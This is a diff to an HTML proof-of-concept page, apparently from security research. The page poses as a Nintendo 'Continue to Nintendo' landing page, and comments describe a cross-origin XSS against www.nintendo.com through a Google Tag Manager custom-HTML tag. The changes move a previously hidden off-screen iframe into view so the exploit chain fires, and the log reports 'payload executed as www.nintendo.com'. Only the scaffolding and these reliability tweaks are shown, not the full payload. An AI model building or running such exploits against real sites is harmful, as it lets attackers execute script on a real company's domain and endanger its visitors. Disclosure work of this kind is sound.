@@ -10,15 +10,18 @@
  button{font-size:19px;padding:14px 30px;border:0;border-radius:9px;background:#e60012;color:#fff;cursor:pointer}
  button:disabled{background:#999;cursor:default}
  #log{display:block;margin:26px auto 0;max-width:600px;text-align:left;font:11px/1.4 ui-monospace,monospace;background:#111;color:#0f0;padding:10px;border-radius:7px;max-height:220px;overflow:auto;white-space:pre-wrap}
- #stage{position:fixed;left:-20000px;top:0;width:1250px;height:820px;border:0}
+ /* the working frame MUST be on-screen and painted: Chrome only fires
+    IntersectionObserver callbacks for a frame that actually paints, and
+    Nintendo's own lazy loader is what puts the players on the page. */
+ #stage{display:block;width:100%;max-width:1200px;height:760px;margin:18px auto 0;border:1px solid #ddd;border-radius:8px}
 </style>
-<div class="wrap">
+<div class="wrap" id="card">
   <h1>Nintendo Sound Clock: Alarmo</h1>
   <p>Click below to continue to the official Nintendo page.</p>
   <button id="go">Continue to Nintendo</button>
   <pre id="log">waiting for click...</pre>
+  <iframe id="stage" allow="autoplay; fullscreen"></iframe>
 </div>
-<iframe id="stage" allow="autoplay; fullscreen"></iframe>
 <script>
 /* PoC - cross-origin XSS on www.nintendo.com
    GTM container GTM-NVPD62, custom-HTML tag 1242.
@@ -116,5 +119,7 @@ document.getElementById('go').onclick = async function(){
   }
   L(hit ? "done - payload executed as www.nintendo.com" : "done - no execution this run, reload and click again");
 };
+  /* keep the working frame in view; it must paint for the chain to run */
+  try { stage.scrollIntoView({block:"center"}); } catch(e) {}
 </script>
 </html>
